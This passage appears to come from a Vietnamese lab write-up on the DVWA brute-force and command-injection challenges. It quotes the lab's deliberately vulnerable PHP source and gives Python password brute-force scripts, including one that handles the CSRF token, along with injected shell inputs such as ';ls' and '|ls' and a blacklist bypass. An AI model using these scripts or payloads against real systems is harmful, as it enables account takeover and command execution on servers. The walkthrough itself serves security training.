] ) ) { // Get username $user = $_GET [ 'username' ]; // Get password $pass = $_GET [ 'password' ]; $pass = md5 ( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = ' $user ' AND password = ' $pass ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); if ( $result && mysqli_num_rows ( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc ( $result ); $avatar = $row [ \"avatar\" ]; // Login successful echo \"<p>Welcome to the password protected area { $user } </p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; } else { // Login failed echo \"<pre><br />Username and/or password incorrect.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?>","title":"Security Level: Low"},{"location":"dvwa/brute-force/#analysis","text":"\u1ede challenge n\u00e0y ta th\u1ea5y r\u1eb1ng, h\u1ecd kh\u00f4ng d\u00f9ng c\u00e1c c\u01a1 ch\u1ebf b\u1ea3o m\u1eadt. Do \u0111\u00f3 ta ho\u00e0n to\u00e0n c\u00f3 th\u1ec3 d\u00f9ng tool nh\u01b0 BurpSuite, hydra,... \u0111\u1ec3 Brute Force password c\u1ee7a c\u00e1c user. B\u00ean c\u1ea1nh vi\u1ec7c t\u00ecm ra \u0111\u01b0\u1ee3c password c\u1ee7a user admin , ta c\u1ea7n t\u00ecm username c\u1ee7a 3 user c\u00f2n l\u1ea1i: T\u00ecm th\u00f4ng qua vi\u1ec7c Bruteforce username T\u00ecm th\u00f4ng qua vi\u1ec7c t\u1ea5n c\u00f4ng SQLi Quan tr\u1ecdng n\u1eefa. V\u1edbi challenge n\u00e0y ta th\u1ea5y r\u1eb1ng vi\u1ec7c login sai username ho\u1eb7c password s\u1ebd xu\u1ea5t hi\u1ec7n th\u00f4ng tin Username and/or password incorrect. . Do \u0111\u00f3 ta kh\u00f4ng th\u1ec3 d\u00f9ng m\u1ed9t v\u00e0i th\u1ee7 thu\u1eadt nh\u1ecf \u0111\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c username m\u1ed9t c\u00e1ch nhanh ch\u1ed1ng \u0111\u01b0\u1ee3c. Ta c\u1ea7n Brute Force \u0111\u00fang c\u1ea3 v\u1ec1 username l\u1eabn password. Ti\u1ebfp theo, v\u00ec \u0111\u00e2y l\u00e0 challenge cho vi\u1ec7c ki\u1ec3m th\u1eed, n\u00ean ch\u1eafc ch\u1eafn r\u1eb1ng username v\u00e0 password s\u1ebd \u0111\u01a1n gi\u1ea3n v\u00e0 s\u1ebd t\u1ed3n t\u1ea1i trong wordlist.","title":"Analysis"},{"location":"dvwa/brute-force/#exploition","text":"\u1ede challenge n\u00e0y t\u00f4i s\u1ebd g\u1ee3i \u00fd cho c\u00e1c b\u1ea1n s\u1eed d\u1ee5ng python \u0111\u1ec3 Brute Force password. V\u1edbi m\u1ee5c ti\u00eau l\u00e0 t\u00ecm password c\u1ee7a t\u00e0i kho\u1ea3n admin. V\u1edbi c\u00e1c user kh\u00e1c, ta s\u1ebd d\u00f9ng 2 v\u00f2ng for \u0111\u1ec3 Brute Force Source code brute force import requests url = 'http://localhost:4280/vulnerabilities/brute/' params_base = { 'username' : 'admin' , 'Login' : 'Login' } # Qu\u0103ng \u0111\u00f3ng header b\u00ean burp suite v\u00f4 \u0111\u00eai headers = { 'sec-ch-ua' : '' , 'sec-ch-ua-mobile' : '?0' , 'sec-ch-ua-platform' : '' , 'Upgrade-Insecure-Requests' : '1' , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' , 'Sec-Fetch-Site' : 'same-origin' , 'Sec-Fetch-Mode' : 'navigate' , 'Sec-Fetch-User' : '?1' , 'Sec-Fetch-Dest' : 'document' , 'Referer' : 'http://localhost:4280/vulnerabilities/brute/' , 'Accept-Encoding' : 'gzip, deflate' , 'Accept-Language' : 'en-US,en;q=0.9' , 'Cookie' : 'PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low' } # \u0110\u1ecdc danh s\u00e1ch m\u1eadt kh\u1ea9u t\u1eeb wordlist with open ( 'file_name/path_file' , 'r' ) as password_file : for line in password_file : # Lo\u1ea1i b\u1ecf k\u00fd t\u1ef1 xu\u1ed1ng d\u00f2ng t\u1eeb m\u1eadt kh\u1ea9u password = line . strip () # Th\u00eam m\u1eadt kh\u1ea9u v\u00e0o params_base params = params_base . copy () params [ 'password' ] = password # G\u1eedi y\u00eau c\u1ea7u GET v\u1edbi m\u1eadt kh\u1ea9u kh\u00e1c nhau response = requests . get ( url , params = params , headers = headers ) # Ki\u1ec3m tra v\u00e0 x\u1eed l\u00fd ph\u1ea3n h\u1ed3i - d\u00f2ng `Username and/or password incorrect.` trong Sourcecode if \"Username and/or password incorrect.\" not in response . text : print ( f \"\u0110\u00e3 t\u00ecm th\u1ea5y m\u1eadt kh\u1ea9u \u0111\u00fang: { password } \" ) break V\u00e0 k\u1ebft qu\u1ea3 nh\u01b0 h\u00ecnh d\u01b0\u1edbi","title":"Exploition"},{"location":"dvwa/brute-force/#security-level-medium","text":"Source code vulnerabilities/brute/source/medium.php <?php if ( isset ( $_GET [ 'Login' ] ) ) { // Sanitise username input $user = $_GET [ 'username' ]; $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_GET [ 'password' ]; $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = ' $user ' AND password = ' $pass ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); if ( $result && mysqli_num_rows ( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc ( $result ); $avatar = $row [ \"avatar\" ]; // Login successful echo \"<p>Welcome to the password protected area { $user } </p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; } else { // Login failed sleep ( 2 ); echo \"<pre><br />Username and/or password incorrect.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?>","title":"Security Level: Medium"},{"location":"dvwa/brute-force/#analysis_1","text":"\u1ede ph\u1ea7n c\u1ea5p \u0111\u1ed9 n\u00e0y, b\u1ea1n c\u0169ng d\u1ec5 d\u00e0ng c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n Brute Force nh\u01b0 \u1edf c\u1ea5p \u0111\u1ed9 Low. Nh\u01b0ng ph\u1ea3i ch\u1edd 2 gi\u00e2y sau khi login fail (d\u00f2ng sleep(2) trong m\u00e3 ngu\u1ed3n).","title":"Analysis"},{"location":"dvwa/brute-force/#exploition_1","text":"Ta s\u1ebd d\u00f9ng ch\u00ednh source code \u1edf c\u1ea5p \u0111\u1ed9 Low \u0111\u1ec3 bypass c\u1ea5p \u0111\u1ed9 n\u00e0y.","title":"Exploition"},{"location":"dvwa/brute-force/#security-level-high","text":"Source code vulnerabilities/brute/source/high.php <?php if ( isset ( $_GET [ 'Login' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET [ 'username' ]; $user = stripslashes ( $user ); $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_GET [ 'password' ]; $pass = stripslashes ( $pass ); $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Check database $query = \"SELECT * FROM `users` WHERE user = ' $user ' AND password = ' $pass ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); if ( $result && mysqli_num_rows ( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc ( $result ); $avatar = $row [ \"avatar\" ]; // Login successful echo \"<p>Welcome to the password protected area { $user } </p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; } else { // Login failed sleep ( rand ( 0 , 3 ) ); echo \"<pre><br />Username and/or password incorrect.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: High"},{"location":"dvwa/brute-force/#analysis_2","text":"\u1ede c\u1ea5p \u0111\u1ed9 n\u00e0y, h\u1ecd n\u00e2ng t\u1ea7m h\u01a1n b\u1eb1ng vi\u1ec7c th\u00eam CSRF token d\u01b0\u1edbi t\u00ean user_token. T\u1ee9c n\u1ebfu request m\u00e0 sai th\u00ec ngay l\u1eadp t\u1ee9c trang web s\u1ebd t\u1ea1o m\u1ed9t user_token m\u1edbi. user_token V\u00ec user_token n\u00f3 g\u1eafn \u1edf trang web v\u00e0 ch\u1ec9 hidden th\u00f4i, n\u00ean ta c\u00f3 th\u1ec3 khai th\u00e1c \u1edf \u0111i\u1ec3m n\u00e0y. \u0110i\u1ec1u ch\u00fang ta c\u1ea7n hi\u1ec7n gi\u1edd l\u00e0 b\u1eaft \u0111\u01b0\u1ee3c user_token c\u1ee7a trang web tr\u01b0\u1edbc khi th\u1ef1c thi c\u00f4ng \u0111o\u1ea1n login. T\u1ee9c l\u00e0 ph\u1ea3i duy\u1ec7t web l\u1ea5y user_token tr\u01b0\u1edbc, sau \u0111\u00f3 g\u1eafn n\u00f3 v\u00e0o g\u00f3i request g\u1eedi login. Kh\u00fac n\u00e0y, ta h\u1ecfi ChatGPT th\u00f4i :3","title":"Analysis"},{"location":"dvwa/brute-force/#exploition_2","text":"Ro\u00e0i, tri\u1ec3n khai th\u00f4i. find.py import requests import re # URL c\u1ee7a trang web b\u1ea1n mu\u1ed1n truy c\u1eadp url = 'http://localhost:4280/vulnerabilities/brute/' # T\u1ea1o y\u00eau c\u1ea7u GET \u0111\u1ec3 t\u1ea3i trang web response = requests . get ( url ) # Ki\u1ec3m tra xem y\u00eau c\u1ea7u c\u00f3 th\u00e0nh c\u00f4ng kh\u00f4ng if response . status_code == 200 : # S\u1eed d\u1ee5ng bi\u1ec3u th\u1ee9c ch\u00ednh quy \u0111\u1ec3 t\u00ecm gi\u00e1 tr\u1ecb c\u1ee7a th\u1ebb c\u00f3 name=\"user_token\" pattern = r '<input.*?type=[\" \\' ]hidden[\" \\' ].*?name=[\" \\' ]user_token[\" \\' ].*?value=[\" \\' ](.*?)[\" \\' ].*?>' match = re . search ( pattern , response . text ) # Ki\u1ec3m tra xem c\u00f3 t\u00ecm th\u1ea5y gi\u00e1 tr\u1ecb hay kh\u00f4ng if match : user_token_value = match . group ( 1 ) print ( f 'Gi\u00e1 tr\u1ecb c\u1ee7a th\u1ebb c\u00f3 name=\"user_token_value\" l\u00e0: { user_token_value } ' ) else : print ( 'Kh\u00f4ng t\u00ecm th\u1ea5y th\u1ebb c\u00f3 name=\"user_token_value\" tr\u00ean trang web.' ) else : print ( 'Kh\u00f4ng th\u1ec3 truy c\u1eadp trang web.' ) K\u1ebft h\u1ee3p \u0111o\u1ea1n code tr\u00ean v\u00e0 \u0111o\u1ea1n code \u1edf challenge Low. Ta \u0111\u01b0\u1ee3c code ho\u00e0n ch\u1ec9nh (l\u01b0u \u00fd \u1edf challenge n\u00e0y c\u00f3 th\u1eddi gian login fail \u0111\u01b0\u1ee3c random t\u1eeb 0 t\u1edbi 3s). high.py import requests import re url = 'http://localhost:4280/vulnerabilities/brute/' params_base = { 'username' : 'admin' , 'Login' : 'Login' , 'user_token' : csrf_token } headers = { 'sec-ch-ua' : '' , 'sec-ch-ua-mobile' : '?0' , 'sec-ch-ua-platform' : '' , 'Upgrade-Insecure-Requests' : '1' , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' , 'Sec-Fetch-Site' : 'same-origin' , 'Sec-Fetch-Mode' : 'navigate' , 'Sec-Fetch-User' : '?1' , 'Sec-Fetch-Dest' : 'document' , 'Referer' : 'http://localhost:4280/vulnerabilities/brute/' , 'Accept-Encoding' : 'gzip, deflate' , 'Accept-Language' : 'en-US,en;q=0.9' , 'Cookie' : 'PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low' } # \u0110\u1ecdc danh s\u00e1ch m\u1eadt kh\u1ea9u t\u1eeb t\u1ec7p pass.txt with open ( 'rockyou.txt' , 'r' ) as password_file : for line in password_file : # Lo\u1ea1i b\u1ecf k\u00fd t\u1ef1 xu\u1ed1ng d\u00f2ng t\u1eeb m\u1eadt kh\u1ea9u password = line . strip () # Th\u00eam m\u1eadt kh\u1ea9u v\u00e0o params_base params = params_base . copy () params [ 'password' ] = password # G\u1eedi y\u00eau c\u1ea7u GET v\u1edbi m\u1eadt kh\u1ea9u kh\u00e1c nhau response = requests . get ( url , params = params , headers = headers ) if response . status_code != 200 : pattern = r '<input.*?type=[\" \\' ]hidden[\" \\' ].*?name=[\" \\' ]user_token[\" \\' ].*?value=[\" \\' ](.*?)[\" \\' ].*?>' match = re . search ( pattern , response . text ) user_token = match . group ( 1 ) params [ 'user_token' ] = user_token # Ki\u1ec3m tra v\u00e0 x\u1eed l\u00fd ph\u1ea3n h\u1ed3i \u1edf \u0111\u00e2y # V\u00ed d\u1ee5: n\u1ebfu c\u00f3 d\u1ea5u hi\u1ec7u m\u1eadt kh\u1ea9u \u0111\u00fang, b\u1ea1n c\u00f3 th\u1ec3 in ra v\u00e0 d\u1eebng v\u00f2ng l\u1eb7p if \"Username and/or password incorrect.\" not in response . text : print ( f \"\u0110\u00e3 t\u00ecm th\u1ea5y m\u1eadt kh\u1ea9u \u0111\u00fang: { password } \" ) break B\u00ean c\u1ea1nh vi\u1ec7c d\u00f9ng th\u01b0 vi\u1ec7n re \u0111\u1ec3 t\u00ecm ph\u1ea7n t\u1eed trong website, ta c\u00f3 th\u1ec3 d\u00f9ng BeautifulSoup thay th\u1ebf. V\u1ec1 c\u01a1 b\u1ea3n, b\u01b0\u1edbc \u0111\u1ea7u c\u1ee7a vi\u1ec7c test pass l\u00e0 \u0111\u1eb7t 1 csrf_token gi\u1ea3 \u0111\u1ec3 g\u1eedi request t\u1edbi website. Sau \u0111\u00f3 ch\u1eafc ch\u1eafn r\u1eb1ng csrf_token l\u00fac n\u00e0y s\u1ebd b\u1ecb thay \u0111\u1ed5i sau l\u1ea7n request \u0111\u1ea7u ti\u00ean. L\u00fac n\u00e0y ta s\u1ebd d\u00f2 website \u0111\u1ec3 l\u1ea5y csrf_token v\u00e0 \u0111\u01b0a n\u00f3 v\u00e0o bi\u1ebfn user_token. T\u1eeb request th\u1ee9 2 tr\u1edf \u0111i, m\u1ecdi chuy\u1ec7n s\u1ebd \u0111\u01a1n gi\u1ea3n h\u01a1n nhi\u1ec1u.","title":"Exploition"},{"location":"dvwa/brute-force/#security-level-impossible","text":"Source code vulnerabilities/brute/source/impossible.php <?php if ( isset ( $_POST [ 'Login' ] ) && isset ( $_POST [ 'username' ]) && isset ( $_POST [ 'password' ]) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST [ 'username' ]; $user = stripslashes ( $user ); $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_POST [ 'password' ]; $pass = stripslashes ( $pass ); $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Default values $total_failed_login = 3 ; $lockout_time = 15 ; $account_locked = false ; // Check the database (Check user information) $data = $db -> prepare ( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // Check to see if the user has been locked out. if ( ( $data -> rowCount () == 1 ) && ( $row [ 'failed_login' ] >= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo \"<pre><br />This account has been locked due to too many incorrect logins.</pre>\"; // Calculate when the user would be allowed to login again $last_login = strtotime ( $row [ 'last_login' ] ); $timeout = $last_login + ( $lockout_time * 60 ); $timenow = time (); /* print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"<br />\"; print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"<br />\"; print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"<br />\"; */ // Check to see if enough time has passed, if it hasn't locked the account if ( $timenow < $timeout ) { $account_locked = true ; // print \"The account is locked<br />\"; } } // Check the database (if username matches the password) $data = $db -> prepare ( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> bindParam ( ':password' , $pass , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // If its a valid login... if ( ( $data -> rowCount () == 1 ) && ( $account_locked == false ) ) { // Get users details $avatar = $row [ 'avatar' ]; $failed_login = $row [ 'failed_login' ]; $last_login = $row [ 'last_login' ]; // Login successful echo \"<p>Welcome to the password protected area <em> { $user } </em></p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; // Had the account been locked out since last login? if ( $failed_login >= $total_failed_login ) { echo \"<p><em>Warning</em>: Someone might of been brute forcing your account.</p>\" ; echo \"<p>Number of login attempts: <em> { $failed_login } </em>.<br />Last login attempt was at: <em> { $last_login } </em>.</p>\" ; } // Reset bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } else { // Login failed sleep ( rand ( 2 , 4 ) ); // Give the user some feedback echo \"<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in { $lockout_time } minutes</em>.</pre>\" ; // Update bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Set the last login time $data = $db -> prepare ( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Impossible"},{"location":"dvwa/brute-force/#analysis_3","text":"Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a \"lock out\" feature, where if there are five bad logins within the last 15 minutes, the locked out user cannot log in. If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know if there is a valid account on the system, with that password, and if the account is locked. This can cause a \"Denial of Service\" (DoS), by having someone continually trying to login to someone's account. This level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).","title":"Analysis"},{"location":"dvwa/brute-force/#what-we-learned","text":"CSRF token Write script","title":"What we learned"},{"location":"dvwa/brute-force/#more-information","text":"https://owasp.org/www-community/attacks/Brute_force_attack http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password https://www.golinuxcloud.com/brute-force-attack-web-forms","title":"More Information"},{"location":"dvwa/command-injection/","tags":["DVWA"],"text":"Command Injection \u00b6 Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. This attack differs from Code Injection , in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. Security Level: Low \u00b6 Source code vulnerabilities/exec/source/low.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $target = $_REQUEST [ 'ip' ]; // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } ?> Analysis \u00b6 Nh\u00ecn source code tr\u00ean, d\u1ec5 d\u00e0ng th\u1ea5y \u0111\u01b0\u1ee3c target c\u1ee7a ta l\u00e0 th\u1ef1c thi th\u1ee9 g\u00ec \u0111\u00f3 t\u1ea1i shell kh\u00f4ng ch\u1ec9 m\u1ed7i vi\u1ec7c ping IP (c\u00f3 th\u1ec3 m\u1edf reverse shell, ...) Ta th\u1ea5y r\u1eb1ng \u1edf \u0111o\u1ea1n code tr\u00ean kh\u00f4ng h\u1ec1 c\u00f3 vi\u1ec7c filter \u0111\u1ea7u v\u00e0o c\u00f3 ph\u1ea3i l\u00e0 IP hay kh\u00f4ng, v\u00ec \u0111i\u1ec1u n\u00e0y, ta c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng bypass b\u1eb1ng vi\u1ec7c nh\u1eadp m\u1ed9t d\u00e3y l\u1ec7nh (ng\u0103n c\u00e1ch v\u1edbi nhau b\u1eb1ng d\u1ea5u ch\u1ea5m ph\u1ea9y \u0111\u1ec3 th\u1ec3 hi\u1ec7n t\u1eebng l\u1ec7nh) nh\u01b0 10.10.10.10;ls,... hay c\u01a1 b\u1ea3n h\u01a1n l\u00e0 ;ls l\u00e0 c\u00f3 th\u1ec3 bypass \u0111\u01b0\u1ee3c challenge Exploition \u00b6 Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch \u1edf tr\u00ean, ta s\u1ebd bypass challenge b\u1eb1ng vi\u1ec7c ti\u00eam l\u1ec7nh ls N\u00e2ng cao h\u01a1n, ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng tr\u00ecnh nghe netcat \u0111\u1ec3 k\u1ebft n\u1ed1i v\u1edbi m\u00e1y kh\u00e1c. What we learned \u00b6 Read code Security Level: Medium \u00b6 Source code vulnerabilities/exec/source/medium.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $target = $_REQUEST [ 'ip' ]; // Set blacklist $substitutions = array ( '&&' => '' , ';' => '' , ); // Remove any of the characters in the array (blacklist). $target = str_replace ( array_keys ( $substitutions ), $substitutions , $target ); // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } ?> Analysis \u00b6 Challenge n\u00e0y th\u1eed th\u00e1ch h\u01a1n m\u1ed9t ch\u00fat v\u00ec h\u1ecb d\u00f9ng blacklist \u0111\u1ec3 filter to\u00e1n t\u1eed && v\u00e0 ; . Nh\u01b0ng blacklist n\u00e0y ch\u1eafc ch\u1eafn l\u00e0 ch\u01b0a \u0111\u1ee7, c\u00f2n nhi\u1ec1u lo\u1ea1i to\u00e1n t\u1eed trong linux gi\u00fap \u00edch cho vi\u1ec7c th\u1ef1c thi l\u1ec7nh n\u1eefa c\u01a1. Xem th\u00eam c\u00e1c to\u00e1n t\u1eed trong linux t\u1ea1i https://www.makeuseof.com/linux-command-line-chaining-operators/ Ho\u1eb7c xem b\u1ea3ng t\u1ed5ng h\u1ee3p b\u00ean d\u01b0\u1edbi Name Description The Ampersand Operator ( & ) Run linux command in background The Semicolon Operator ( ; ) Execute commands in a defined, sequential order The OR Operator ( || ) Execute the command that follows only if the preceding command fails The Pipe Operator ( | ) The pipe operator directs the output of the preceding command as input to the succeeding command The AND Operator ( && ) Execute commands only if the preceding command was successfully executed The NOT Operator ( ! ) The NOT operator works in similar ways to an except statement in programming The Precedence Operator ( (...) ) Visit here The Combination Operator ( {...} ) Group commands Concatenation or the Escape Operator ( \\ ) Visit here The Redirection Operators ( > , >> , < ) Visit here Exploition \u00b6 Quay tr\u1edf l\u1ea1i challenge, ta d\u1ec5 d\u00e0ng c\u00f3 th\u1ec3 t\u1ea1o 1 l\u1ec7nh cho n\u00f3 ch\u1ea1y background nh\u01b0 h\u00ecnh d\u01b0\u1edbi. &ls -la source What we learned \u00b6 Blacklist Security Level: High \u00b6 Source code vulnerabilities/exec/source/high.php <?php if ( isset ( $_POST [ 'Submit' ] ) ) { // Get input $target = trim ( $_REQUEST [ 'ip' ]); // Set blacklist $substitutions = array ( '&' => '' , ';' => '' , '| ' => '' , '-' => '' , '$' => '' , '(' => '' , ')' => '' , '`' => '' , '||' => '' , ); // Remove any of the characters in the array (blacklist). $target = str_replace ( array_keys ( $substitutions ), $substitutions , $target ); // Determine OS and execute the ping command. if ( stristr ( php_uname ( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec ( 'ping ' . $target ); } else { // *nix $cmd = shell_exec ( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre> { $cmd } </pre>\" ; } ?> Analysis \u00b6 L\u1ea1i l\u00e0 blacklist, nh\u01b0ng l\u1ea7n n\u00e0y ta th\u1ea5y \u0111\u1ea5y. H\u1ecd filter h\u1ebft to\u00e0n b\u1ed9 to\u00e1n t\u1eed n\u1eb1m trong ph\u1ea7n Security Level: Medium :3 Ch\u00fa \u00fd thi\u1ec7t k\u0129 blacklist, b\u1ea1n s\u1ebd nh\u1eadn ra \u0111i\u1ec1u b\u1ea5t ng\u1edd Hint B\u1ea1n c\u00f3 \u0111\u1ec3 \u00fd filter to\u00e1n t\u1eed pipe kh\u00f4ng, n\u00f3 c\u00f3 kho\u1ea3ng tr\u1eafng ph\u00eda sau \u0111\u1ea5y. T\u1ee9c l\u00e0 n\u00f3 filter | ch\u1ee9 kh\u00f4ng ph\u1ea3i filter | . Hay n\u00f3i c\u00e1ch kh\u00e1c, d\u00f9ng |ls s\u1ebd th\u1ef1c thi th\u00e0nh c\u00f4ng l\u1ec7nh. L\u1ec7nh trim() c\u0169ng g\u00f3p ph\u1ea7n nh\u1ecf trong vi\u1ec7c filter n\u00e0y, v\u00ec l\u1ec7nh trim() ch\u1ec9 x\u00f3a kho\u1ea3ng tr\u1eafng \u1edf \u0111\u1ea7u/cu\u1ed1i chu\u1ed7i. Vi\u1ec7c nh\u1eadp kho\u1ea3ng tr\u1eafng \u1edf \u0111o\u1ea1n gi\u1eefa, th\u00ec h\u00e0m trim() s\u1ebd kh\u00f4ng filter \u0111\u01b0\u1ee3c. H\u01a1n n\u1eefa, c\u00f3 m\u1ed9t \u00fd n\u00e2ng cao trong n\u00e0y, v\u00ec blacklist n\u00f3 ch\u1ec9 \u0111\u1ecdc v\u00e0 filter | n\u00ean ta c\u00f3 th\u1ec3 bypass b\u1eb1ng | | . T\u1ee9c n\u00f3 x\u00f3a \u0111i |<kho\u1ea3ng tr\u1eafng> v\u00e0 c\u00f2n l\u1ea1i | . \u0110\u00e2y c\u0169ng l\u00e0 m\u1ed9t ph\u1ea7n ph\u1ea3i ch\u00fa \u00fd. M\u1edf r\u1ed9ng 